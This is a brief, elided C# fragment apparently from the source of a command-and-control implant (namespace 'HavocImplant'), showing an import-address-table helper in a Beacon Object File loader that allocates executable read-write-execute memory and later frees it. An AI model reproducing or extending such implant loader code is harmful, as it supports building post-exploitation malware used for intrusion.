...
namespace HavocImplant.AgentFunctions.BofExec.Internals
{
    class IAT
    {
        ...
        {
            this.iat_pages = 2;
            this.iat_addr = NativeDeclarations.NtAllocateVirtualMemory(IntPtr.Zero, (uint)(this.iat_pages * Environment.SystemPageSize), NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
            this.iat_count = 0;
        ...
        internal void Clear()
        {
            ...
            // free it
            NativeDeclarations.NtFreeVirtualMemory(this.iat_addr, 0, NativeDeclarations.MEM_RELEASE);
